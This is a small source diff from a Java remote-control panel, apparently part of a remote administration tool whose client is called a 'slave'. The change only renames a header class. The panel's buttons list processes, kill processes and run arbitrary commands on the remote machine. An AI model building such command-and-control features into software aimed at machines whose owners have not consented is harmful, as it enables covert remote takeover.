@@ -15,8 +15,8 @@ import javax.swing.table.DefaultTableModel;
 
 import com.redpois0n.Slave;
 import com.redpois0n.common.OperatingSystem;
+import com.redpois0n.packets.OutgoingHeader;
 import com.redpois0n.packets.incoming.PacketBuilder;
-import com.redpois0n.packets.outgoing.Header;
 import com.redpois0n.ui.renderers.table.ProcessTableRenderer;
 import com.redpois0n.utils.Util;
 
@@ -42,7 +42,7 @@ public class PanelControlRemoteProcess extends PanelControlParent {
 				while (model.getRowCount() > 0) {
 					model.removeRow(0);
 				}
-				sl.addToSendQueue(Header.LIST_PROCESSES);
+				sl.addToSendQueue(OutgoingHeader.LIST_PROCESSES);
 			}
 		});
 		btnRefresh.setIcon(new ImageIcon(PanelControlRemoteProcess.class.getResource("/icons/update.png")));
@@ -62,9 +62,9 @@ public class PanelControlRemoteProcess extends PanelControlParent {
 						model.removeRow(0);
 					}
 					
-					sl.addToSendQueue(new PacketBuilder(Header.KILL_PROCESS, process));				
+					sl.addToSendQueue(new PacketBuilder(OutgoingHeader.KILL_PROCESS, process));				
 					
-					sl.addToSendQueue(Header.LIST_PROCESSES);
+					sl.addToSendQueue(OutgoingHeader.LIST_PROCESSES);
 				}
 			}
 		});
@@ -79,11 +79,11 @@ public class PanelControlRemoteProcess extends PanelControlParent {
 					return;
 				}
 				proc = proc.trim();
-				sl.addToSendQueue(new PacketBuilder(Header.RUN_COMMAND, proc));
+				sl.addToSendQueue(new PacketBuilder(OutgoingHeader.RUN_COMMAND, proc));
 				while (model.getRowCount() > 0) {
 					model.removeRow(0);
 				}
-				sl.addToSendQueue(Header.LIST_PROCESSES);
+				sl.addToSendQueue(OutgoingHeader.LIST_PROCESSES);
 			}
 		});
 
